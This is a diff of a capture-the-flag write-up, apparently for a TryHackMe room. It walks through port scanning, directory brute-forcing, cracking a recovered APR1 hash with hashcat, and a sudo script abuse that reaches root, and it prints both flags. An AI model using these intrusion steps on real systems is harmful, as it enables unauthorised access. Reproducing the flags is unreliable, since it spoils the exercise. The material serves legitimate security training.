@@ -1,3 +1,9 @@
+---
+custom_edit_url: null
+pagination_next: null
+pagination_prev: null
+---
+
 ## Task 1: Deploy the machine
 ### Deploy the machine
 ### No answer needed
@@ -28,8 +34,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 45.99 seconds
 ```
 - As we can see there are two open ports:
-	- Port 22: ssh
-	- Port 80: http
 
 | Port | Service | 
 |---|---|
@@ -40,22 +44,30 @@ Nmap done: 1 IP address (1 host up) scanned in 45.99 seconds
 ```
 2
 ```
-## Question
-> What service is running on port 22?
-## Answer
+
+&nbsp;
+
+### What service is running on port 22?
+### Answer
 ```
 SSH
 ```
-## Question
-> What service is running on port 80?
-## Answer
+
+&nbsp;
+
+### What service is running on port 80?
+### Answer
 ```
 HTTTP
 ```
-## Question
-> What is the user.txt flag?
+
+&nbsp;
+
+### What is the user.txt flag?
 - Let's check the IP address through the browser.
-![[2 74.png]]
+
+![2](https://github.com/Knign/Write-ups/assets/110326359/8a85076a-7870-41e6-8abf-ec595aac7c4d)
+
 - Now that we know it is hosting a `apache2` server, we can brute force the directories using `gobuster`.
 ```
 $ gobuster dir -u http://10.10.228.18 -w /usr/share/wordlists/dirb/small.txt 
@@ -83,12 +95,18 @@ Finished
 ===============================================================
 ```
 - Let's go to the `admmin` directory and see what we can find.
-![[3 57.png]]
+
+![3](https://github.com/Knign/Write-ups/assets/110326359/3870ef97-743d-4637-8af3-9378a7202e0f)
+
 - Let's go to the `Admin` page.
-![[4 41.png]]
+
+![4](https://github.com/Knign/Write-ups/assets/110326359/af7be9ad-a52a-4550-a901-fd6ded193313)
+
 - From what Alex said in his final message, we know that he has probably set up a squid proxy.
 - Before we look for it's directory let's see what `Archive` has.
-![[5 26.png]]
+
+![5](https://github.com/Knign/Write-ups/assets/110326359/ded7ca6c-d3f7-488f-b6fe-8770af0e5cc6)
+
 - Let's click on `Download`.
 ```
 $ ls
@@ -117,16 +135,22 @@ $ cat README
 This is a Borg Backup repository.
 See https://borgbackup.readthedocs.io/
 ```
-## BORG backup
+#### BORG backup
 - BORG is a  duplication program used to securely and efficiently backup data.
 - It can also be used to backup entire filesystems which can then be mounted onto other filesystems for easier examination.
 - Having read the messages between the two admin, we can guess that this is a probably a backup of Alex's filesystem.
 - However, before we do that, let's first check out the `etc` directory as well.
-![[7 13.png]]
+
+![7](https://github.com/Knign/Write-ups/assets/110326359/6f6994a4-1639-4bad-a156-e7db0dda3047)
+
 - Ah! So this is where the `squid` directory for the Squid proxy was located. Let's go inside.
-![[8 6.png]]
+
+![8](https://github.com/Knign/Write-ups/assets/110326359/0e07adff-6dad-4b9a-94ad-0448df5ab556)
+
 - The `passwd` file probably has some useful information.
-![[9 3.png]]
+
+![9](https://github.com/Knign/Write-ups/assets/110326359/2c6ee7a6-5087-44eb-9043-84a992071be5)
+
 - We have what looks to be a pair of a username `music_archive` and a hashed password `$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`.
 - Let's identify the hash using the `hash-identifier` utility.
 ```
@@ -150,7 +174,9 @@ Possible Hashs:
 [+] MD5(APR)
 ```
 - Before we crack the hash let's save the hash in a `hash.txt` file and take a look at the hash-mode for MD5(APR).
-![[10 2.png]]
+
+![10](https://github.com/Knign/Write-ups/assets/110326359/2974bd92-6ea7-4246-8aec-2e07e064a859)
+
 - Now we can use `hashcat` to crack the hash.
 ```
 $ hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt                          
@@ -266,12 +292,14 @@ Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Vid
 $ cat user.txt 
 flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
 ```
-## Answer
+### Answer
 ```
 flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
 ```
-## Question
-> What is the root.txt flag?
+
+&nbsp;
+
+### What is the root.txt flag?
 - In order to find the root flag we need to become the `root` user.
 - Using the `sudo` command we can see what files we can execute 
 ```
@@ -284,8 +312,7 @@ User alex may run the following commands on ubuntu:
 
 ```
 - We can see the `/etc/mp3backups/backup.sh` script can be executed by any user, including us.
-## backup.sh
-```bash
+```bash title="backup.sh"
 #!/bin/bash
 
 sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
@@ -355,7 +382,7 @@ root.txt
 bash-4.3# cat root.txt 
 flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
 ```
-## Answer
+### Answer
 ```
 flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
 ```
